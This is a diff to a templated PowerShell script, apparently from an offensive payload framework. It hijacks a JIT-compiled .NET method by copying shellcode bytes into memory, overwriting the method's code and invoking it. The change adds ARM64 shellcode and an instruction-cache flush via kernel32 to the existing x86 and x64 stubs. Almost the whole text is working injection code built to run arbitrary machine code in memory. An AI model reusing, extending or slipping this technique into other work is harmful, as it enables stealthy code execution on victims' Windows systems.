@@ -46,9 +46,18 @@ $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Xor)
 $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ret)
 $%{var_tgt_meth} = ($%{var_dyn_type}.CreateType()).GetMethod('%{str_tgt_meth}')
 
+if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') {
+  $%{var_flush_type} = %{func_build_dyn_type}('%{str_flush_type}')
+  $%{var_flush_method} = $%{var_flush_type}.DefinePInvokeMethod('%{str_flush_method}', 'kernel32.dll', 'FlushInstructionCache', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static -bOr [System.Reflection.MethodAttributes]::PinvokeImpl, [System.Reflection.CallingConventions]::Standard, [Bool], [Type[]]@([IntPtr], [IntPtr], [UIntPtr]), [System.Runtime.InteropServices.CallingConvention]::Winapi, [System.Runtime.InteropServices.CharSet]::Auto)
+  $%{var_flush_method}.SetImplementationFlags($%{var_flush_method}.GetMethodImplementationFlags() -bOr [System.Reflection.MethodImplAttributes]::PreserveSig)
+  $%{var_flush_method} = ($%{var_flush_type}.CreateType()).GetMethod('%{str_flush_method}')
+}
+
 foreach ($Exec in 1..20) { $%{var_tgt_meth}.Invoke($null, @(0x11112222)) | Out-Null }
 
-if ( [IntPtr]::Size -eq 4 ) {
+if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') {
+  $%{var_sc} = [Byte[]] @(0xF3,0x53,0xBA,0xA9,0xF5,0x5B,0x01,0xA9,0xF7,0x63,0x02,0xA9,0xF9,0x6B,0x03,0xA9,0xFB,0x73,0x04,0xA9,0xFD,0x7B,0x05,0xA9,0x09,0x00,0x00,0x94,0xFD,0x7B,0x45,0xA9,0xFB,0x73,0x44,0xA9,0xF9,0x6B,0x43,0xA9,0xF7,0x63,0x42,0xA9,0xF5,0x5B,0x41,0xA9,0xF3,0x53,0xC6,0xA8,0x00,0x00,0x80,0xD2,0xC0,0x03,0x5F,0xD6)
+} elseif ( [IntPtr]::Size -eq 4 ) {
   $%{var_sc} = [Byte[]] @(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)
 } else {
   $%{var_sc} = [Byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,0x31,0xC0,0xC3)
@@ -58,10 +67,14 @@ $%{var_sc_addr} = [Runtime.InteropServices.Marshal]::AllocHGlobal($%{var_sc}.Len
 [Runtime.InteropServices.Marshal]::Copy($%{var_sc}, 0, $%{var_sc_addr}, $%{var_sc}.Length)
 
 $%{var_args} = New-Object Object[](3)
-$%{var_args}[0] = [IntPtr]$(%{func_get_meth_addr} $%{var_tgt_meth})
+$%{var_tgt_addr} = [IntPtr]$(%{func_get_meth_addr} $%{var_tgt_meth})
+$%{var_args}[0] = $%{var_tgt_addr}
 $%{var_args}[1] = $%{var_sc_addr}
 $%{var_args}[2] = $%{var_sc}.Length
 
 $%{var_src_meth}.Invoke($null, $%{var_args})
+if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') {
+  $%{var_flush_method}.Invoke($null, @([IntPtr](-1), $%{var_tgt_addr}, [UIntPtr]$%{var_sc}.Length)) | Out-Null
+}
 
 $%{var_tgt_meth}.Invoke($null, @(0x11112222))
